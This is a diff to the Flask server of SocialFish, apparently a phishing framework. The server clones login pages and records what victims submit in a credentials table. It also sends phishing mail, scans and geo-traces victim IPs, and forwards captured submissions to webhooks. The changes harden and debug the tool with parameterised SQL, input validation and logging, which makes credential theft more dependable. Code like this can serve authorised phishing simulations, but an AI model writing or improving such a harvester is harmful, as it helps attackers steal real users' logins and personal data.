@@ -20,7 +20,7 @@ from core.cookie_inspector import CookieInspector
 from core.recorder_selenium import SeleniumRecorder
 from core.mock_server import MockLoginServer
 from core.advanced_attacks import TabJacking, FileUploadInjection, AdvancedStealth, CAPTCHASolver
-from datetime import date
+from datetime import date, datetime
 from sys import argv, exit, version_info
 import colorama
 import sqlite3
@@ -29,7 +29,12 @@ import os
 import json
 import hashlib
 import asyncio
+import logging
 from pathlib import Path
+
+# Configure logging
+logger = logging.getLogger("SocialFish")
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
 
 # Verificar argumentos
 if len(argv) < 2:
@@ -64,6 +69,32 @@ def before_request():
 def teardown_request(exception):
     if hasattr(g, 'db'):
         g.db.close()
+
+# Ensure `socialfish` table has a default row and provide safe getters
+def ensure_socialfish_row(conn):
+    try:
+        # `conn` may be a sqlite3.Connection; use its execute which returns a cursor
+        conn.execute("""CREATE TABLE IF NOT EXISTS socialfish (
+                                            id integer PRIMARY KEY,
+                                            clicks integer,
+                                            attacks integer,
+                                            token text
+                                        ); """)
+        cur = conn.execute("SELECT id FROM socialfish WHERE id = 1")
+        if cur.fetchone() is None:
+            t = genToken()
+            conn.execute('INSERT INTO socialfish(id,clicks,attacks,token) VALUES(?,?,?,?)', (1, 0, 0, t))
+            conn.commit()
+    except Exception as e:
+        print(f'[-] ensure_socialfish_row error: {e}')
+
+
+def sf_get(cur, column, default=None):
+    try:
+        row = cur.execute(f"SELECT {column} FROM socialfish where id = 1").fetchone()
+        return row[0] if row and row[0] is not None else default
+    except Exception:
+        return default
 
 # Conta o numero de credenciais salvas no banco
 def countCreds():
@@ -155,13 +186,29 @@ def admin():
 # funcao onde e realizada a renderizacao da pagina para a vitima
 @app.route("/")
 def getLogin():
+    # Get config from database instead of global variables
+    conn = g.db
+    config = conn.execute("SELECT * FROM socialfish WHERE id = 1").fetchone()
+    # Retrieve status and URL from config or use defaults
+    cur = conn.execute("SELECT status, url, beef FROM config LIMIT 1")
+    conf_row = cur.fetchone()
+
+    if conf_row:
+        sta, url, beef = conf_row[0], conf_row[1], conf_row[2]
+    else:
+        sta = 'custom'
+        url = 'https://github.com/UndeadSec/SocialFish'
+        beef = 'no'
+    
     # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
     if sta == 'clone':
-        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
+        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
+        # Sanitize agent to prevent path traversal
+        agent = agent.replace('..', '').replace('/', '_')
         clone(url, agent, beef)
         o = url.replace('://', '-')
         cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
+        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
         g.db.commit()
         template_path = 'fake/{}/{}/index.html'.format(agent, o)
         return render_template(template_path)
@@ -171,7 +218,7 @@ def getLogin():
     # caso seja configurada para custom
     else:
         cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
+        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
         g.db.commit()
         return render_template('custom.html')
 
@@ -182,28 +229,42 @@ def postData():
         fields = [k for k in request.form]
         values = [request.form[k] for k in request.form]
         data = dict(zip(fields, values))
-        browser = str(request.user_agent.browser)
-        bversion = str(request.user_agent.version)
-        platform = str(request.user_agent.platform)
+        browser = str(request.user_agent.browser) if request.user_agent else 'Unknown'
+        bversion = str(request.user_agent.version) if request.user_agent else 'Unknown'
+        platform = str(request.user_agent.platform) if request.user_agent else 'Unknown'
         rip = str(request.remote_addr)
         d = "{:%m-%d-%Y}".format(date.today())
+        
+        # Get redirect URL from config table
         cur = g.db
+        conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
+        red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
+        
+        # Get the target URL from config
+        url_row = cur.execute("SELECT url FROM config LIMIT 1").fetchone()
+        url = url_row[0] if url_row else 'https://github.com/UndeadSec/SocialFish'
+        
         sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
         creds = (url, str(data), d, browser, bversion, platform, rip)
         cur.execute(sql, creds)
         g.db.commit()
+    
+    # Get redirect URL from config
+    cur = g.db
+    conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
+    red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
+    
     return redirect(red)
 
 # funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
 @app.route('/configure', methods=['POST'])
 def echo():
-    global url, red, sta, beef
-    red = request.form['red']
-    sta = request.form['status']
-    beef = request.form['beef']
+    red = request.form.get('red', 'https://github.com/UndeadSec/SocialFish')
+    sta = request.form.get('status', 'custom')
+    beef = request.form.get('beef', 'no')
 
     if sta == 'clone':
-        url = request.form['url']
+        url = request.form.get('url', 'https://github.com/UndeadSec/SocialFish')
     else:
         url = 'Custom'
 
@@ -215,8 +276,22 @@ def echo():
     else:
         url = 'https://github.com/UndeadSec/SocialFish'
         red = 'https://github.com/UndeadSec/SocialFish'
+    
+    # Store configuration in database instead of global variables
     cur = g.db
-    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
+    # Create config table if it doesn't exist
+    cur.execute("""CREATE TABLE IF NOT EXISTS config (
+        id INTEGER PRIMARY KEY,
+        url TEXT,
+        red TEXT,
+        status TEXT,
+        beef TEXT
+    )""")
+    
+    cur.execute("DELETE FROM config")
+    cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
+                (url, red, sta, beef))
+    cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
     g.db.commit()
     return redirect('/creds')
 
@@ -225,9 +300,11 @@ def echo():
 @flask_login.login_required
 def getCreds():
     cur = g.db
-    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    # Ensure the socialfish row exists and get values safely
+    ensure_socialfish_row(cur)
+    attacks = sf_get(cur, 'attacks', 0)
+    clicks = sf_get(cur, 'clicks', 0)
+    tokenapi = sf_get(cur, 'token', '')
     data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
     return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)
 
@@ -237,9 +314,11 @@ def getCreds():
 def getMail():
     if request.method == 'GET':
         cur = g.db
-        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
-        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
-        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
+        row = cur.execute("SELECT email, smtp, port FROM sfmail where id = 1").fetchone()
+        if row:
+            email, smtp, port = row[0], row[1], row[2]
+        else:
+            email, smtp, port = '', '', ''
         return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
     if request.method == 'POST':
         subject = request.form['subject']
@@ -251,9 +330,9 @@ def getMail():
         port = request.form['port']
         sendMail(subject, email, password, recipient, body, smtp, port)
         cur = g.db
-        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
+        cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
+        cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
+        cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
         g.db.commit()
         return redirect('/mail')
 
@@ -262,9 +341,11 @@ def getMail():
 @flask_login.login_required
 def getSingleCred(id):
     try:
-        sql = "SELECT jdoc FROM creds where id = {}".format(id)
+        if not id.isdigit():
+            return "Invalid ID"
+        sql = "SELECT jdoc FROM creds WHERE id = ?"
         cur = g.db
-        credInfo = cur.execute(sql).fetchall()
+        credInfo = cur.execute(sql, (id,)).fetchall()
         if len(credInfo) > 0:
             return render_template('admin/singlecred.html', credInfo=credInfo)
         else:
@@ -276,16 +357,31 @@ def getSingleCred(id):
 @app.route("/trace/<ip>", methods=['GET'])
 @flask_login.login_required
 def getTraceIp(ip):
+    import re
+    # Validate IP format
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
+    
+    if not re.match(ip_pattern, ip):
+        return "Invalid IP format", 400
+    
     try:
         traceIp = tracegeoIp(ip)
         return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
-    except:
-        return "Network Error"
+    except Exception as e:
+        print(f'[-] Trace error: {str(e)}')
+        return "Network Error", 500
 
 # rota para scan do nmap
 @app.route("/scansf/<ip>", methods=['GET'])
 @flask_login.login_required
 def getScanSf(ip):
+    import re
+    # Validate IP format
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
+    
+    if not re.match(ip_pattern, ip):
+        return "Invalid IP format", 400
+    
     return render_template('admin/scansf.html', nScan=nScan, ip=ip)
 
 # rota post para revogar o token da api
@@ -295,10 +391,11 @@ def revokeToken():
     revoke = request.form['revoke']
     if revoke == 'yes':
         cur = g.db
-        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
-        cur.execute(upsql)
+        new_token = genToken()
+        cur.execute("UPDATE socialfish SET token = ? WHERE id = 1", (new_token,))
         g.db.commit()
-        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+        ensure_socialfish_row(cur)
+        token = sf_get(cur, 'token', '')
         genQRCode(token, revoked=True)
     return redirect('/creds')
 
@@ -614,8 +711,8 @@ def victim_capture(lure_hash):
                     'timestamp': date.today().isoformat()
                 }
                 requests.post(webhook_url, json=payload, timeout=5)
-            except:
-                pass  # Silently fail webhook
+            except (requests.RequestException, Exception) as e:
+                print(f'[-] Webhook failed: {str(e)}')
         
         # Emit live notification via WebSocket
         socketio.emit('victim_submission', {
@@ -634,11 +731,16 @@ def victim_capture(lure_hash):
     
     # GET - return cloned page
     if template[1] == 'clone':
-        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
+        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
+        # Sanitize agent to prevent path traversal
+        agent = agent.replace('..', '').replace('/', '_').replace('\\', '_')
         clone(template[0], agent, 'no')  # Clone without BEEF
         o = template[0].replace('://', '-')
         template_path = f'fake/{agent}/{o}/index.html'
-        return render_template(template_path)
+        try:
+            return render_template(template_path)
+        except Exception:
+            return "Template not found", 404
     else:
         # Return custom template or generic form
         return render_template('custom.html')
@@ -783,7 +885,8 @@ def unauthorized_handler():
 @app.route("/api/checkKey/<key>", methods=['GET'])
 def checkKey(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         status = {'status':'ok'}
     else:
@@ -793,11 +896,12 @@ def checkKey(key):
 @app.route("/api/statistics/<key>", methods=['GET'])
 def getStatics(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         cur = g.db
-        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
-        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
+        attacks = sf_get(cur, 'attacks', 0)
+        clicks = sf_get(cur, 'clicks', 0)
         countC = countCreds()
         countNPU = countNotPickedUp()
         info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
@@ -808,7 +912,8 @@ def getStatics(key):
 @app.route("/api/getJson/<key>", methods=['GET'])
 def getJson(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         try:
             sql = "SELECT * FROM creds"
@@ -830,19 +935,19 @@ def getJson(key):
 
 @app.route('/api/configure', methods = ['POST'])
 def postConfigureApi():
-    global url, red, sta, beef
     if request.is_json:
         content = request.get_json()
         cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-        if content['key'] == tokenapi:
-            red = content['red']
-            beef = content['beef']
-            if content['sta'] == 'clone':
-                sta = 'clone'
-                url = content['url']
+        ensure_socialfish_row(cur)
+        tokenapi = sf_get(cur, 'token', '')
+        if content.get('key') == tokenapi:
+            red = content.get('red', 'https://github.com/UndeadSec/SocialFish')
+            beef = content.get('beef', 'no')
+            sta = content.get('sta', 'custom')
+            
+            if sta == 'clone':
+                url = content.get('url', 'https://github.com/UndeadSec/SocialFish')
             else:
-                sta = 'custom'
                 url = 'Custom'
 
             if url != 'Custom':
@@ -854,8 +959,12 @@ def postConfigureApi():
                     red = 'http://' + red
             else:
                 red = 'https://github.com/UndeadSec/SocialFish'
-            cur = g.db
-            cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
+            
+            # Store in database instead of global variables
+            cur.execute("DELETE FROM config")
+            cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
+                        (url, red, sta, beef))
+            cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
             g.db.commit()
             status = {'status':'ok'}
         else:
@@ -869,7 +978,8 @@ def postSendMail():
     if request.is_json:
         content = request.get_json()
         cur = g.db
-        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+        ensure_socialfish_row(cur)
+        tokenapi = sf_get(cur, 'token', '')
         if content['key'] == tokenapi:
             subject = content['subject']
             email = content['email']
@@ -880,9 +990,9 @@ def postSendMail():
             port = content['port']
             if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                 cur = g.db
-                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
+                cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
+                cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
+                cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
                 g.db.commit()
                 status = {'status':'ok'}
             else:
@@ -895,14 +1005,24 @@ def postSendMail():
 
 @app.route("/api/trace/<key>/<ip>", methods=['GET'])
 def getTraceIpMob(key, ip):
+    import re
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
+    
+    # Validate IP format
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
+    
+    if not re.match(ip_pattern, ip):
+        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
+    
     if key == tokenapi:
         try:
             traceIp = tracegeoIp(ip)
             return jsonify(traceIp)
-        except:
-            content = {'status':'bad'}
+        except Exception as e:
+            print(f'[-] API trace error: {str(e)}')
+            content = {'status':'bad', 'error': 'Trace failed'}
             return jsonify(content)
     else:
         content = {'status':'bad'}
@@ -910,10 +1030,23 @@ def getTraceIpMob(key, ip):
 
 @app.route("/api/scansf/<key>/<ip>", methods=['GET'])
 def getScanSfMob(key, ip):
+    import re
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
+    
+    # Validate IP format
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
+    
+    if not re.match(ip_pattern, ip):
+        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
+    
     if key == tokenapi:
-        return jsonify(nScan(ip))
+        try:
+            return jsonify(nScan(ip))
+        except Exception as e:
+            print(f'[-] API scan error: {str(e)}')
+            return jsonify({'status':'bad', 'error': 'Scan failed'})
     else:
         content = {'status':'bad'}
         return jsonify(content)
@@ -921,7 +1054,8 @@ def getScanSfMob(key, ip):
 @app.route("/api/infoReport/<key>", methods=['GET'])
 def getReportMob(key):
     cur = g.db
-    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
+    ensure_socialfish_row(cur)
+    tokenapi = sf_get(cur, 'token', '')
     if key == tokenapi:
         urls = cur.execute("SELECT url FROM creds").fetchall()
         users = cur.execute("SELECT name FROM professionals").fetchall()
@@ -1104,6 +1238,18 @@ def mock_server_start():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # Recording Studio - Choose recorder type
+def emit_recording_log(event_type, message, **kwargs):
+    """Emit recording events to connected clients via WebSocket"""
+    try:
+        socketio.emit(event_type, {
+            'message': message,
+            'type': event_type,
+            'timestamp': datetime.datetime.now().isoformat(),
+            **kwargs
+        }, broadcast=False)
+    except Exception as e:
+        logger.debug(f"Failed to emit WebSocket event {event_type}: {e}")
+
 @app.route("/studio/recorder", methods=['GET', 'POST'])
 @flask_login.login_required
 def recording_studio():
@@ -1123,13 +1269,19 @@ def recording_studio():
     
     try:
         if recorder_type == 'selenium':
+            emit_recording_log('recorder_log', f"Initializing Selenium recorder ({browser})")
             recorder = SeleniumRecorder(browser=browser, headless=headless)
             recorder.init_driver()
+            emit_recording_log('recorder_log', "Browser driver initialized")
             success = recorder.record_flow(target_url)
+            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
         else:
             # Default Playwright
+            emit_recording_log('recorder_log', "Initializing Playwright recorder")
             recorder = PlaywrightRecorder(DATABASE, headless=headless)
+            emit_recording_log('recorder_log', "Launching browser instance")
             success = asyncio.run(recorder.record_flow(target_url))
+            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
         
         return jsonify({
             'status': 'ok',
@@ -1137,6 +1289,8 @@ def recording_studio():
             'message': f'Recording started with {recorder_type}'
         })
     except Exception as e:
+        emit_recording_log('recording_error', str(e))
+        logger.exception(f"Recording error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # Attack Payloads Dashboard
@@ -1318,12 +1472,18 @@ def webhook_handler():
     print(f"[+] Webhook data received from {victim_ip}: {webhook_type}")
     
     # Broadcast to admin panel via WebSocket
-    socketio.emit('webhook_data', {
+    # Avoid passing `broadcast` keyword directly to ensure compatibility
+    payload = {
         'type': webhook_type,
         'victim_ip': victim_ip,
         'data': data,
         'timestamp': date.today().isoformat()
-    }, broadcast=True)
+    }
+    try:
+        socketio.emit('webhook_data', payload)
+    except TypeError:
+        # Fallback for older/newer server implementations
+        socketio.server.emit('webhook_data', payload)
     
     return jsonify({'status': 'ok'})
 
